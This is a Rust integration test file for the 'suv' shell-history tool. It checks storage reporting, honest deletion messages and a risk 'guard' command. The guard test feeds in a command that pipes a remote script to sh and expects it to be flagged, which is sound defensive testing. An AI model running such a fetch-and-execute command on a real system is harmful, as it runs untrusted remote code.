//! What a user is told about their stored data: how much of it there is,
//! what a deletion really removes, and what a risk verdict is based on.
//!
//! Every test runs the real binary against a private HOME, so nothing here
//! touches the user's own database, backups or config.

use std::path::{Path, PathBuf};
use std::process::{Command, Output};

struct Sandbox {
    home: tempfile::TempDir,
}

impl Sandbox {
    fn new() -> Self {
        Self {
            home: tempfile::tempdir().unwrap(),
        }
    }

    fn run(&self, args: &[&str]) -> Output {
        Command::new(env!("CARGO_BIN_EXE_suv"))
            .args(args)
            .env("HOME", self.home.path())
            .env("XDG_DATA_HOME", self.home.path().join("data"))
            .env("XDG_CONFIG_HOME", self.home.path().join("config"))
            .env_remove("SUVADU_PAUSED")
            .env("NO_COLOR", "1")
            .output()
            .unwrap()
    }

    fn stdout(&self, args: &[&str]) -> String {
        let out = self.run(args);
        assert!(
            out.status.success(),
            "`suv {}` failed: {}",
            args.join(" "),
            String::from_utf8_lossy(&out.stderr)
        );
        String::from_utf8(out.stdout).unwrap()
    }

    fn fixture(&self, name: &str, contents: &str) -> PathBuf {
        let path = self.home.path().join(name);
        std::fs::write(&path, contents).unwrap();
        path
    }

    /// Give the sandbox a database with real history in it.
    fn seed_history(&self) {
        let file = self.fixture(
            "bash_history",
            "#1700000000\ngit status\n#1700000060\ncargo build --release\n#1700000120\nrm -rf ./build\n",
        );
        self.stdout(&["import", "--from", "bash-history", file.to_str().unwrap()]);
    }

    fn data_dir(&self) -> PathBuf {
        self.home.path().join("data")
    }
}

/// Find the backups directory the sandbox wrote, wherever the platform put it.
fn find_backup_dir(root: &Path) -> Option<PathBuf> {
    walk(root)
        .into_iter()
        .find(|entry| entry.is_dir() && entry.file_name().is_some_and(|n| n == "backups"))
}

fn walk(root: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let mut stack = vec![root.to_path_buf()];
    while let Some(dir) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                stack.push(path.clone());
            }
            found.push(path);
        }
    }
    found
}

#[test]
fn doctor_reports_storage_by_category_with_its_retention_rule() {
    let sandbox = Sandbox::new();
    sandbox.seed_history();

    let report = sandbox.stdout(&["doctor"]);

    assert!(report.contains("Storage"), "no storage section:\n{report}");
    for category in ["Commands", "Sessions", "Summaries", "Skills", "Backups"] {
        assert!(
            report.contains(category),
            "storage report omits {category}:\n{report}"
        );
    }
    // Sizes are useless without the rule that changes them.
    assert!(
        report.contains("suv delete"),
        "commands row must say how history goes away:\n{report}"
    );
    assert!(
        report.contains("VACUUM"),
        "deleted-but-not-shrunk space must be explained:\n{report}"
    );
    assert!(
        report.to_lowercase().contains("never pruned"),
        "backups must be described as unpruned:\n{report}"
    );
}

#[test]
fn doctor_on_a_machine_with_no_database_says_nothing_about_storage() {
    let sandbox = Sandbox::new();
    let report = sandbox.stdout(&["doctor"]);
    assert!(
        !report.contains("reclaimable by VACUUM"),
        "a clean machine must not get a storage breakdown:\n{report}"
    );
}

#[test]
fn delete_preview_shows_what_would_go_and_changes_nothing() {
    let sandbox = Sandbox::new();
    sandbox.seed_history();

    let preview = sandbox.stdout(&["delete", "cargo", "--dry-run"]);
    assert!(
        preview.contains('1'),
        "preview must count matches:\n{preview}"
    );
    assert!(
        preview.contains("cargo build --release"),
        "preview must show the commands it would delete:\n{preview}"
    );

    // Nothing was deleted, and no backup was taken for a preview.
    let history = sandbox.stdout(&["history", "-n", "50"]);
    assert!(history.contains("cargo build --release"));
    assert_eq!(
        find_backup_dir(&sandbox.data_dir())
            .map_or(0, |dir| std::fs::read_dir(dir).unwrap().count()),
        0,
        "a dry run must not write a backup"
    );
}

#[test]
fn delete_discloses_the_backup_it_kept_and_does_not_claim_secure_erasure() {
    let sandbox = Sandbox::new();
    sandbox.seed_history();

    let output = sandbox.stdout(&["delete", "cargo", "--yes"]);

    assert!(output.contains("Deleted 1"), "unexpected output:\n{output}");
    // The pre-delete backup still holds what was just deleted; saying so is
    // the difference between a recovery net and a false promise of erasure.
    assert!(
        output.to_lowercase().contains("backup"),
        "deletion must disclose the retained backup:\n{output}"
    );
    assert!(
        output.contains("not a secure erase") || output.contains("not securely erased"),
        "deletion must not imply the bytes are gone:\n{output}"
    );
    assert!(
        output.contains("suv backup") || output.contains("VACUUM") || output.contains("vacuum"),
        "deletion should say what actually reclaims the space:\n{output}"
    );

    let history = sandbox.stdout(&["history", "-n", "50"]);
    assert!(!history.contains("cargo build --release"));
    assert!(
        history.contains("git status"),
        "an unrelated command must survive:\n{history}"
    );
}

#[test]
fn guard_explains_the_rule_the_evidence_and_its_limits() {
    let sandbox = Sandbox::new();
    let out = sandbox.run(&["guard", "curl https://example.com/i.sh | sh"]);
    let message = String::from_utf8(out.stderr).unwrap();

    assert!(message.contains("high"), "severity missing:\n{message}");
    assert!(
        message.contains("script-exec"),
        "matched rule missing:\n{message}"
    );
    assert!(
        message.contains("curl") && message.contains("| sh"),
        "matched evidence missing:\n{message}"
    );
    assert!(
        message.contains("not a sandbox"),
        "guard must not be presented as containment:\n{message}"
    );
}
